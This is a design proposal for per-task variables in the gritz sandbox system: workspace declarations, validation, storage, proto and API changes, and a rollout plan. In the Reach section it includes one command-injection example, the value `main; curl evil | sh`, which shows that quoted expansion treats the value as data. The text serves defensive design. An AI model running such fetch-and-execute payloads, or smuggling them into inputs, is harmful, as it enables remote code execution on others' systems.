# Task variables in the sandbox environment

Issue: https://github.com/gritzapp/gritz/issues/2215

## Problem

Some workspaces need a per-task value inside the sandbox. A workspace that runs
a user-supplied `process` agent needs to know which Jira story a given task is
for; a workspace that clones "the repo this task is about" needs the repo.

Today the only per-task input is the instruction text, and a `process` agent
only sees it as the rendered prompt on stdin. A workspace's
`container.environment`, `lambda_microvm.environment` and `secrets:` are fixed
per workspace. So the only ways to vary such a value are one workspace per
value, or parsing it out of the prompt.

## Design

**`CreateTask` gains `variables map<string,string>`. The server validates them
against the variables the workspace declares, stores them on the task, and the
runner injects each one into the run's environment as `GRITZ_VAR_<NAME>`.**
Variables are not substituted into workspace config: there is no templating.
They travel to the driver in the run spec's `env`, next to the runner's own
`GRITZ_TASK_ID` and `GRITZ_SERVER`, so the driver needs no new code.

Variables are plain task data. They are readable by anyone who can read the
task, like its instructions, and appear unmasked in the shipped log.
Credentials stay in the workspace's `secrets:`.

A workspace that wants a Jira story key:

```yaml
workspaces:
  story-agent:
    variables:
      JIRA_ISSUE:
        description: The Jira story this task is for
        required: true
      BRANCH:
        description: Branch to check out
        default: main
      LABEL:
        description: Extra label for the PR
    container:
      image: ghcr.io/gritzapp/gritz-workspace-debian:latest
    commands:
      - git clone --branch "$GRITZ_VAR_BRANCH" https://github.com/acme/app.git /work
    agent:
      type: process
      process:
        command: [/usr/local/bin/story-agent]   # reads $GRITZ_VAR_JIRA_ISSUE
```

```
gritz task create -w story-agent -r prod --var JIRA_ISSUE=APP-142 -i "Implement the story"
```

The sandbox's run environment then carries `GRITZ_VAR_JIRA_ISSUE=APP-142`,
`GRITZ_VAR_BRANCH=main` and no `GRITZ_VAR_LABEL` (not set, not required, no
default).

### Names

**Task variable `NAME` is injected as the environment variable
`GRITZ_VAR_NAME`.** Names match `^[A-Z][A-Z0-9_]{0,63}$`, checked in one place
(`taskvar.ValidName`), used by `Workspace.Validate` on the runner and by the
server on every write path.

**Values** are at most 4 KiB, contain no NUL byte (the one byte an environment
value can't hold), and a task has at most 32 variables. Values are otherwise
opaque: newlines and shell metacharacters are allowed, since the environment
carries them as data (see [Reach](#reach)).

### Declared variables only

A workspace declares its variables under `variables:`, keyed by name:

| Field | Meaning |
| --- | --- |
| `description` | Shown in the web UI's forms and in `gritz workspaces`. |
| `required` | Creating a task without it fails. |
| `default` | Used when the caller doesn't set it. Not allowed with `required`. |

**An undeclared variable is an error** (`InvalidArgument: workspace
"story-agent" declares no variable "JIRA"`), as is a missing required one.
Allowing undeclared variables was considered and rejected: a typo
(`JIRA_ISUE`) would silently produce a task whose agent sees nothing, and the
web UI couldn't render a form. Declaring a variable costs one config line; a
workspace with no `variables:` accepts none.

The runner already sends the server its workspaces with `RegisterWorkspaces`;
`RegisteredWorkspace` gains the declarations, and the server stores them in a
new `workspaces.variables` column. **`CreateTask` resolves variables on the
server**: it rejects undeclared and missing-required variables, fills in
defaults, and stores the result, so a manual create gets the error at once.

**The runner resolves them again at every run start**, against its own
declarations: `TaskManager.specs` calls
`taskvar.Resolve(ws.VariableDecls(), inputs.Variables)` on what
`GetRunSpecInputs` returns, and injects the result. A missing required
variable or an undeclared one fails the spec, and `TaskRunner` fails the run
through its existing spec-failure path, with the message on the timeline. A
runner's `workspaces.yaml` is therefore authoritative for every run: a runner
restarted with a changed `variables:` fails the next start of an existing task
whose variables it no longer accepts, and fills in a default it newly
declares. This is also what catches a schedule whose stored values went stale
(see [Who sets variables](#who-sets-variables)).

Variables are immutable after creation, like `namespace`: `UpdateTask` can't
change them, and a restart reruns with the same stored values.

**Missing variables.** A declared, non-required variable without a default
that the caller didn't set is absent from the task, and its environment
variable is unset in the sandbox (not set to the empty string), so
`${GRITZ_VAR_X:-fallback}` and `[ -n "${GRITZ_VAR_X+x}" ]` behave as a reader
expects. An explicit empty string is a value, kept as such.

### Reach

Variables are added to the **run's environment**, the one the driver builds
with `driverserver.Env` (the driver process's environ, then `RunSpec.env`,
then `RunSpec.secrets`) and passes to:

- **Setup `commands:`.** The driver runs each with `sh -c` and the run
  environment, on the first run of the sandbox (resuming after the last
  completed command on a restart; see
  [resume setup from failed command](/proposals/implemented/resume-setup-from-failed-command/)).
  Variables are immutable and present from the first run, so `commands:` can
  use them: `git clone --branch "$GRITZ_VAR_BRANCH" ...` works, and a command
  re-run on a restart sees the same value. Referencing a variable through the
  environment is also the safe form: the shell expands `"$GRITZ_VAR_BRANCH"`
  as one word of data, never as shell syntax, so a value of
  `main; curl evil | sh` is a (bad) branch name, not a command. Unquoted, it
  is still word-split and globbed, so the docs show the quoted form.
- **The agent CLI** (Claude Code, Codex, `process`, ...) and everything it
  spawns: its tool calls, and stdio MCP servers that inherit the environment.
- **The agent's `cwd`**, which the driver already expands against the run
  environment (`envx.Expand(cfg.Cwd, d.Env)`), so `cwd: /work/$GRITZ_VAR_REPO`
  works.

Variables do **not** reach:

- Anything the runner expands when it loads `workspaces.yaml`: `${env:}` and
  `${sh:}` run on the runner host before any task exists, and the image,
  volumes, `mcp_servers` entries and other config fields are fixed per
  workspace. That is the "no templating" line.
- The sandbox's own process environment: the driver process, the container's
  entrypoint, and `gritz shell` sessions, which today don't get the run
  environment either (secrets included).
- The prompt. The agent finds its variables in its environment; the rendered
  prompt doesn't change, and `get_my_task`'s output doesn't list them.

### Who sets variables

Every path that creates a task validates variables with the same function,
`taskvar.Resolve`, against the workspace's stored declarations.

| Path | How |
| --- | --- |
| `CreateTask` RPC | `variables` (field 9). |
| MCP `create_task` (`gritz mcp`, server MCP) | `variables`, an object of string to string. |
| `gritz task create` | `--var NAME=VALUE`, repeatable. The value is the literal text after the first `=`. |
| Web UI new-task page | One field per declared variable of the selected workspace, from `ListWorkspaces`: description as help text, required marked, default as placeholder. |
| Schedules | `Schedule.variables`, fixed values, copied onto each task unresolved. |
| Routing rules | `CreateTaskAction.variables`, fixed values. |

**Schedules and routing rules set fixed values**: a `map<string, string>`
saved with the schedule or rule, the same for every task it creates. Nothing
from a triggering event is copied into a variable. Both are validated against
the workspace's declarations when they are saved (`InvalidArgument` for an
undeclared variable or a missing required one), and the literal values are
stored, not the resolved set.

**`scheduler.Fire` copies a schedule's values onto the task without resolving
them.** The runner may have re-registered the workspace with different
declarations since the schedule was saved, and `scheduler.Tick` fires a whole
batch in one transaction, so an error from one stale schedule would roll back
every fire in the batch and leave them all due. Instead the stale schedule
creates its task, and the runner, which resolves every task's variables when it
starts it, fails that task with the reason on its timeline. Defaults are filled
in by the runner the same way. The schedule keeps firing, failing each task,
until someone edits it.

### Storage

```sql
-- migrate:up
ALTER TABLE tasks ADD COLUMN variables JSONB NOT NULL DEFAULT '{}';
ALTER TABLE workspaces ADD COLUMN variables JSONB NOT NULL DEFAULT '[]';
ALTER TABLE schedules ADD COLUMN variables JSONB NOT NULL DEFAULT '{}';

-- migrate:down
ALTER TABLE schedules DROP COLUMN IF EXISTS variables;
ALTER TABLE workspaces DROP COLUMN IF EXISTS variables;
ALTER TABLE tasks DROP COLUMN IF EXISTS variables;
```

- `tasks.variables`: the task's `{name: value}`, resolved for a task from
  `CreateTask`, as given for one from a schedule. Added to the `CreateTask`
  insert and the `GetTask`, `GetTaskForUpdate`, `ListTasks` and
  `ListTasksPage` selects. Never updated.
- `workspaces.variables`: the declarations as registered, written by
  `RegisterWorkspaces` (which already replaces a runner's rows wholesale).
- `schedules.variables`: the schedule's `{name: value}` as saved, unresolved.
- Routing rules are stored as JSON already; `CreateTaskAction` gains a field
  and needs no migration.

A variable is never queried by name, so a JSON column beats a
`task_variables` table.

### Proto

```proto
// gritz.v1

service GritzService {
  // ...
  // Called by the runner before it starts a task's run, to get what the run's
  // spec needs from the server: the token the sandbox calls the API with, as
  // CreateTaskToken returns it, and the task's variables.
  rpc GetRunSpecInputs(GetRunSpecInputsRequest) returns (GetRunSpecInputsResponse);  // new
}

message GetRunSpecInputsRequest {  // new
  int64 task_id = 1;
  // The workspace capabilities to grant the token, such as "github_token".
  repeated string capabilities = 2;
}

message GetRunSpecInputsResponse {  // new
  string token = 1;
  // The task's variables, by name, as in Task.variables.
  map<string, string> variables = 2;
}

// VariableDecl is a variable a workspace declares; see workspaces.yaml variables:.
message VariableDecl {  // new
  string name = 1;
  string description = 2;
  bool required = 3;
  // Used when the task doesn't set it. Never set on a required variable.
  string default = 4;
}

message RegisteredWorkspace {
  // ... fields 1-4 unchanged
  repeated VariableDecl variables = 5;  // new
}

message Task {
  // ... fields 1-18 unchanged
  // The task's variables, by name, each injected into its sandbox as the
  // environment variable GRITZ_VAR_<name>. Set at creation and can't be
  // changed.
  map<string, string> variables = 19;  // new
}

message CreateTaskRequest {
  // ... fields 1-8 unchanged
  // The task's variables, by name. Each must be declared by the workspace;
  // declared defaults fill the rest.
  map<string, string> variables = 9;  // new
}

message Schedule {
  // ... fields 1-16 unchanged
  // Variables of the tasks it creates.
  map<string, string> variables = 17;  // new
}
// CreateScheduleRequest and UpdateScheduleRequest gain the same field.

message CreateTaskAction {
  // ... fields 1-4 unchanged
  // Variables of the tasks the rule creates.
  map<string, string> variables = 5;  // new
}
```

`CreateTaskToken` is unchanged. `GetRunSpecInputs` takes the same request
fields, is gated by the same `OpTaskTokenCreate` scope, and its handler mints
the token by calling the `CreateTaskToken` handler, then reads the task's
variables. One RPC per spec keeps the runner's start path at one round trip,
and gives later run-spec inputs from the server a place to go.

`driver.v1.RunSpec` is unchanged apart from the comment on `env`, which also
carries the task's variables.

### API

```go
package taskvar // github.com/gritzapp/gritz/internal/taskvar (new)

// EnvPrefix is the prefix of every task variable's environment variable.
const EnvPrefix = "GRITZ_VAR_"

// Limits on a task's variables.
const (
	MaxVariables  = 32
	MaxValueBytes = 4096
)

// Decl is a variable a workspace declares.
type Decl struct {
	Name        string
	Description string
	Required    bool
	Default     string
}

// Error is a variable that fails resolution; callers map it to InvalidArgument.
type Error struct {
	Name   string
	Reason string
}

// Error returns the failure as `variable "NAME": reason`.
func (e *Error) Error() string

// ValidName reports whether name is a valid variable name.
func ValidName(name string) bool

// Env returns the name of the environment variable a task variable is injected as.
func Env(name string) string

// Validate checks a declaration: its name, and that a default isn't set on a
// required variable.
func (d Decl) Validate() error

// Resolve checks given against decls and returns the task's variables, with
// defaults filled in and unset optional variables omitted.
func Resolve(decls []Decl, given map[string]string) (map[string]string, error)
```

```go
package workspace // github.com/gritzapp/gritz/internal/runner/workspace

// VariableConfig is a variables: entry; the map key is the variable's name.
type VariableConfig struct { // new
	Description string `yaml:"description"`
	Required    bool   `yaml:"required"`
	Default     string `yaml:"default"`
}

type Workspace struct {
	// ...
	// Variables declares the per-task values a task may set, injected as
	// GRITZ_VAR_<NAME>.
	Variables map[string]VariableConfig `yaml:"variables,omitempty"` // new
}

// VariableDecls returns the workspace's declarations, sorted by name.
func (w *Workspace) VariableDecls() []taskvar.Decl // new

// Validate also checks every declaration.
func (w *Workspace) Validate() error // changed
```

```go
package model // github.com/gritzapp/gritz/internal/model

type Task struct {
	// ...
	Variables map[string]string // new
}

type Schedule struct {
	// ...
	Variables map[string]string // new
}

type CreateTaskAction struct {
	// ...
	Variables map[string]string // new
}
```

```go
package store // github.com/gritzapp/gritz/internal/store

// GetWorkspaceVariables returns the variable declarations of a runner's registered
// workspace, or a not-found error when it isn't registered.
func (s *Store) GetWorkspaceVariables(ctx context.Context, tx *sql.Tx, runner, workspace string, orgID int64) ([]taskvar.Decl, error) // new; replaces HasWorkspace
```

```go
package apiserver // github.com/gritzapp/gritz/internal/server/apiserver

// GetRunSpecInputs returns the task token and the task's variables for a run's spec.
func (s *Server) GetRunSpecInputs(ctx context.Context, req *gritzv1.GetRunSpecInputsRequest) (*gritzv1.GetRunSpecInputsResponse, error) // new
```

```go
package runner // github.com/gritzapp/gritz/internal/runner (unexported, shown for the flow)

type specInput struct {
	// ...
	// Variables are the task's variables, from GetRunSpecInputs.
	Variables map[string]string // new
}
```

**How it fits:** the runner's `RegisterWorkspaces` sends each workspace's
`VariableDecls`; the server stores them. `CreateTask`, the MCP `create_task`
tool (through the RPC) and `eventrouter.Router.create` each call
`store.GetWorkspaceVariables` and `taskvar.Resolve` and store the result on
`model.Task`. `SetRoutingRules` and the schedule handlers validate against the
same declarations on save; `scheduler.Fire` copies the schedule's values onto
`model.Task` as they are. `TaskManager.specs` calls `GetRunSpecInputs` in
place of `CreateTaskToken`, resolves the variables against
`ws.VariableDecls()`, and passes the token and the resolved variables to
`buildSpecs`, which adds each variable to `Spec.Env` under
`taskvar.Env(name)`. `buildSpecs` already copies `Spec.Env` into
`RunSpec.env`.

**When the workspace sets the same name.** `buildSpecs` sets every task
variable in `Spec.Env` without checking the workspace's maps, so the outcome of
a `GRITZ_VAR_X` entry in the workspace follows the layering the run environment
already has:

- A `secrets:` entry named `GRITZ_VAR_X` wins: the driver layers
  `RunSpec.secrets` over `RunSpec.env`, so the run sees the workspace's value.
- A `container.environment` or `lambda_microvm.environment` entry named
  `GRITZ_VAR_X` loses to the task's value. `container.environment` is the
  container's own environment, below `RunSpec.env`, and `buildSpecs` builds
  `RunSpec.env` from the backend's `RunEnv` (`lambda_microvm.environment`) with
  `Spec.Env` copied over it.

The task still stores the value it was created with.

## Implementation Plan

1. **`taskvar` package** — Delivers: `ValidName`, `Env`, `Decl.Validate`,
   `Resolve`, `Error`. Depends on: nothing. Verifiable by: table tests over
   names, undeclared, missing-required, default and limit cases.
2. **Workspace `variables:`** — Delivers: `VariableConfig`,
   `Workspace.Variables`, `VariableDecls`, validation of each declaration;
   `gritz workspaces` prints declarations. Depends on: (1). Verifiable by:
   `workspace` config tests; a config with a declared variable loads, one with
   an invalid declaration doesn't. Nothing reads variables yet.
3. **Migration, proto and store** — Delivers: the three columns, the proto
   messages and fields above (the `GetRunSpecInputs` handler comes in (4)),
   `model.Task.Variables`, the store read and write of `tasks.variables` and
   `workspaces.variables`, `RegisterWorkspaces` storing declarations, and the
   runner sending them. Depends on: (2). Verifiable by: migration up and down;
   store round-trip tests; `ListWorkspaces` returns the declarations after a
   runner registers.
4. **`CreateTask` and `GetRunSpecInputs`** — Delivers:
   `GetWorkspaceVariables` replacing `HasWorkspace` in `CreateTask`,
   resolution, variables on `Task` in responses, and the `GetRunSpecInputs`
   handler. Depends on: (3). Verifiable by: `apiserver` tests for each
   rejection and for defaults; a `GetRunSpecInputs` test returning a working
   token and the stored variables, and refusing a caller without
   `OpTaskTokenCreate`.
5. **Runner injection** — Delivers: `TaskManager.specs` calling
   `GetRunSpecInputs`, `specInput.Variables`, `buildSpecs` adding variables to
   `Spec.Env`, the `driver.proto` comment. Depends on: (4). Verifiable by:
   `spec_test.go` cases; an e2e test with the dummy agent running `env` that
   sees `GRITZ_VAR_X`.
6. **CLI and MCP** — Delivers: `gritz task create --var`, `variables` on the
   server MCP `create_task` tool. Depends on: (4).
   Verifiable by: command and MCP handler tests.
7. **Web UI: new task and task page** — Delivers: variable fields on
   `tasks.new.tsx` from the selected workspace's declarations; variables shown
   on the task page. Depends on: (4). Verifiable by: creating a task against
   the dev stack.
8. **Schedules** — Delivers: `schedules.variables` read and write, validation
   on save, `scheduler.Fire` copying the values onto the task unresolved,
   `TaskManager.specs` resolving every task's variables against the runner's
   declarations, the MCP schedule tools' `variables`, the schedule form's
   variable fields. Depends on: (4), and (7) for the shared form fields.
   Verifiable by: a scheduler test firing a schedule with variables; e2e tests
   for saving, rejecting and running a schedule with variables, and for a
   schedule whose values no longer resolve failing its task on the runner.
9. **Routing rules** — Delivers: `CreateTaskAction.variables`, validation in
   `SetRoutingRules`, resolution in `Router.create`, the rule form's variable
   fields. Depends on: (4), and (7) for the shared form fields. Verifiable by:
   `eventrouter` tests for a rule's variables reaching the created task and
   for a rule whose values no longer resolve; a custom event posted to the
   dev stack creating a task with the variable set.
10. **Docs** — each slice above updates its own pages; this lists them:
    - `operators/workspaces-yaml`: a `variables` section (saying credentials
      belong in `secrets:`), the task's value sitting between the workspace's
      `secrets:` and its environment under "Environment", a `commands:` example quoting
      `"$GRITZ_VAR_X"`, the custom agent process reading one.
    - `concepts/tasks`: a "Variables" section (set at creation, immutable,
      where they appear).
    - `concepts/workspaces`: declared variables in "Picking a workspace".
    - `reference/cli`, `using/cli`: `--var`.
    - `integrations/mcp`: `create_task`'s `variables`.
    - `using/web-ui`: variable fields on the new-task page.
    - `concepts/schedules`: variables on a schedule.
    - `concepts/routing-rules` ("Creating tasks"): variables on a rule.
    - `reference/api` picks up the proto comments on its own.

## Trade-offs

**Raw names (rejected):** any task creator could set `PATH`, `LD_PRELOAD` or
`GH_TOKEN`, and no denylist stays complete.

**Per-variable `env:` mapping (rejected for v1):** wrapping the command
(`env JIRA_ISSUE="$GRITZ_VAR_JIRA_ISSUE" story-agent`) covers it, and it can be
added later.

**`${param:name}` workspace templating (rejected here;
[#2217](https://github.com/gritzapp/gritz/pull/2217) designs it).**
Substituting variables into workspace config would let them reach fields the
environment can't: the image, volumes, `mcp_servers` arguments,
`capabilities`. The cost is that the substitution is textual: a value spliced
into a `commands:` string is shell syntax, so every value needs quoting rules
gritz has to get right, or any caller who can create a task can inject
commands. The config also stops being a fixed thing the runner validates once
at load: each task's effective workspace has to be expanded and validated
(and the image pulled) per task. Environment variables keep the config static
and the values data, at the cost of reaching only processes the run
environment reaches.

**Variables on `CreateTaskTokenResponse`.** The runner already calls
`CreateTaskToken` for every spec, so its response could carry the variables.
That would give a token-minting RPC a second job; `GetRunSpecInputs` names
what the runner actually asks for and leaves `CreateTaskToken`'s contract
alone.

**Separate `RunSpec.variables` field.** The driver could get variables in
their own field and apply the prefix itself. Putting them in `env` reuses the
driver's existing layering unchanged, keeps the prefix rule in one place on
the runner side, and ships with no driver change.

**Resolve only at run time on the runner.** The runner could be the only place
that checks variables. It would leave the server unable to reject a bad
request at `CreateTask`. Resolving on both sides costs a config edit failing
the next start of existing tasks, and in exchange catches stale schedules
without failing the scheduler's batch.

**Resolve in `scheduler.Fire`.** A schedule whose values no longer resolve
would create no task, but `Fire` runs inside `Tick`'s batch transaction, so its
error would roll back every schedule in the batch and keep them all due,
failing again each tick. Failing the one task on the runner puts the error
where the schedule's owner sees it.

**Variables as an event.** Storing variables as an event in the task's stream
would put them in the timeline and in the runner's replica for free, but they
are an attribute of the task fixed at creation, not something that happens to
it, and the runner would have to fold them out of the stream.

## Future work

- **`pattern`.** A declared RE2 expression the whole value must match, checked
  on every write path, so an operator can constrain values
  (`[A-Z][A-Z0-9]+-[0-9]+` for a Jira key).
- **Secret variables.** A `secret: true` declaration whose value is write-only
  in the API and passed in `RunSpec.secrets`, so the shipped log masks it. It
  needs a runner-only read path for the value, rules for schedules and routing
  rules (whose stored values every member can read), and a retention story
  for secret values at rest. Until then, per-task credentials don't belong in
  variables.